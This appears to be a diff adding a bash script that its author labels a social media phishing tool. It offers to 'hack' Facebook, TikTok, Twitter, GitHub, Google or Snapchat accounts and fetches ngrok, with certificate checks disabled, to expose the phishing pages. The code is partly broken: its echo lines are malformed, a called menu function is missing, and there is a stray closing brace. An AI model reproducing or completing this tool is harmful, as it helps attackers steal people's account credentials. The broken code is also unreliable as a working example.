@@ -1,0 +1,135 @@
+#!/bin/bash
+## Coded : by Prince Gutierrez
+## Github : https://github.com/PDGHACK-10
+## Version : 1.0.2
+## about this tool : SOCIAL MEDIA PHISHING TOOL
+## YOUTUBE CHANNEL : PDGHACK-12
+blue='\033[31;1m'
+red='\033[32;1m'
+green='\033[33;1m'
+white='\033[34;1m'
+
+dependencies() {
+
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v openssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's not installed. Install it. Aborting."; exit 1; }
+ 
+
+}
+
+
+
+
+
+main_menu() {
+
+echo -e $red |||||||||||||||||||||||||||||||CODED  BY  PRINCE GUTIERREZ||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |||| ||||||||||||||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |01| ||||FACEBOOK||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |02| ||||TIKTOK  ||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |03| ||||TWITTER ||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |04| ||||GITHUB  ||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |05| ||||GOOGLE  ||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |06| ||||SNAPCHAT||||||||||||||||||||||||
+echo -e $red |||||||||||||||||||||||||||||||||||| |||| ||||||||||||||||||||||||||||||||||||
+read -p $red "ENTER SOCIAL MEDIA TO HACK " hug
+
+if [[ $hug == 1 || $hug == 01 ]]; then
+website="facebook"
+tunnel_menu
+
+elif [[ $hug == 2 || $hug == 02 ]]; then
+website="tiktok"
+tunnel_menu
+
+elif [[ $hug == 3 || $hug == 03 ]]; then
+website="twitter"
+tunnel_menu
+
+elif [[ $hug == 4 || $hug == 04 ]]; then
+website="github"
+tunnel_menu
+
+elif [[ $hug == 5 || $hug == 05 ]]; then
+website="google"
+tunnel_menu
+
+elif [[ $hug == 6 || $hug == 06 ]]; then
+website="snapchat"
+tunnel_menu
+fi
+
+}
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+ngrok_server() {
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+echo
+echo
+echo
+echo
+echo -e $red              ███╗░░██╗░██████╗░██████╗░░█████╗░██╗░░██╗
+echo -e $red              ████╗░██║██╔════╝░██╔══██╗██╔══██╗██║░██╔╝
+echo -e $red              ██╔██╗██║██║░░██╗░██████╔╝██║░░██║█████═╝░
+echo -e $red              ██║╚████║██║░░╚██╗██╔══██╗██║░░██║██╔═██╗░
+echo -e $red              ██║░╚███║╚██████╔╝██║░░██║╚█████╔╝██║░╚██╗
+echo -e $red              ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+echo -e $blue [ red ! blue] red DOWNLOADING NGROK ⚡⚡⚡⚡⚡ [PLEASE WAIT...]
+echo
+echo
+echo
+                              
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
+
+  
+   
